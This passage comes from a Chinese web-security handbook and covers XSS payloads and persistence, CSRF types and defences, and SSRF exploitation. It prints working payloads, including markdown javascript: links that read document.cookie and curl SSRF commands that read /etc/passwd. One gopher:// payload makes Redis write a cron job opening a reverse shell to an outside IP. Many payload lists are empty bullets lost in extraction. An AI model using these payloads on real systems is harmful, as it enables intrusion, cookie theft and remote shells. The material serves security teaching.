例子
// index.php
Preview
var d= atob('');
var cleanvar = DOMPurify.sanitize(d);
document.write(cleanvar);
// payload
&lt;script&gt;alert(1)&lt;/script&gt;'>
4.2. XSS 97
Web-Sec Documentation, 发布 1.0
RPO(Relative Path Overwrite)
RPO(Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服
务器的 Web 缓存技术和配置差异。
4.2.10 Payload
常用
• 
• 
• 
• M
• 
• M
• 
• 
• 
大小写绕过
• 
• 
• 
• 
• 
• 
• 
• 
• 
• 
• 
• 
98 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
各种 alert
• 
• 
• 
• 
• 
• 
• 
• 
• 
• 
• 
• 
• 
伪协议
• M
• M
• M
• M
Chrome XSS auditor bypass
• ?param=https://&param=@z.exeye.io/import%20rel=import%3E
• M
• 
长度限制
\...
4.2. XSS 99
Web-Sec Documentation, 发布 1.0
jquery sourceMappingURL
图片名
">.gif
过期的 payload
• src=javascript:alert 基本不可以用
• css expression 特性只在旧版本 ie 可用
css
markdown
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
![a'"`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
iframe
100 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
• 
• ">
• 
• 
• 
• 
• M
• 
• 
• 
meta
; REL=stylesheet">
4.2.11 持久化
基于存储
有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有
对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的
数据时，部分站点存在 eval(data) 之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应
条件下触发。
在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用 String.fromCharCode 来绕过。
Service Worker
Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请
求，在请求中返回攻击代码，以实现持久化攻击的目的。
在Chrome中，可通过chrome://inspect/#service-workers来查看ServiceWorker的状态，并进行停止。
4.2. XSS 101
Web-Sec Documentation, 发布 1.0
AppCache
在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，
用户访问站点时对应的 payload 会一直存在。
4.2.12 参考链接
wiki
• AwesomeXSS
• w3c
• dom xss wiki
• content-security-policy.com
• markdwon xss
• xss cheat sheet
• html5 security cheatsheet
• http security headers
• XSSChallengeWiki
Challenges
• XSS Challenge By Google
• prompt to win
CSS
• rpo
• rpo 攻击初探
• Reading Data via CSS
• css based attack abusing unicode range
• css injection
• css timing attack
102 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
同源策略
• Same origin policy
• cors security guide
• logically bypassing browser security boundaries
bypass
• 666 lines of xss payload
• xss auditor bypass
• xss auditor bypass writeup
• bypassing csp using polyglot jpegs
• bypass xss filters using javascript global variables
持久化
• 变种 XSS 持久控制 by tig3r
• Using Appcache and ServiceWorker for Evil
Tricks
• Service Worker 安全探索
• 前端黑魔法
4.3 CSRF
4.3.1 简介
跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常
缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的
信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。
4.3.2 分类
4.3. CSRF 103
Web-Sec Documentation, 发布 1.0
资源包含
资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标
签（例如 、、、、 等）所包含的资源的攻击者。如果攻击者
能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。
由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身
执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是
它需要错误地使用安全的 HTTP 请求方式。
基于表单
通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个 JavaScript 片
段，强制受害者的浏览器提交。
该表单可以完全由隐藏的元素组成，以致受害者很难发现它。
如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会
成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将
受害者指向特定页面的网络钓鱼攻击特别有效。
XMLHttpRequest
XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web应用程序依赖 XHR，许多应用花费大量的时
间来构建和实现这一特定的对策。
基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin
Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。
这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器
DOM 的方式。
4.3.3 防御
• 通过 CSRF-token 或者验证码来检测用户提交
• 验证 Referer/Content-Type
• 对于用户修改删除等操作最好都使用 POST 操作
• 避免全站通用的 Cookie，严格设置 Cookie 的域
4.3.4 参考链接
• demo
• Wiping Out CSRF
104 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
• Neat tricks to bypass CSRF protection
4.4 SSRF
4.4.1 简介
服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服
务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接
访问的内部系统。
漏洞危害
SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协
议读取本地文件。
内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限
验证，所以存在 SSRF 时，通常会造成较大的危害。
4.4.2 利用方式
SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。
以curl为例,可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload
如下：
curl -vvv 'dict://127.0.0.1:6379/info'
curl -vvv 'file:///etc/passwd'
# * 注意: 链接使用单引号，避免$ 变量问题
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d
,!%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/
,!6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d
,!%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d
,!%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit
,!%0d%0a'
4.4. SSRF 105
Web-Sec Documentation, 发布 1.0
4.4.3 相关危险函数
SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有
file_get_contents() / fsockopen() / curl_exec() 等。
4.4.4 过滤绕过
更改 IP 地址写法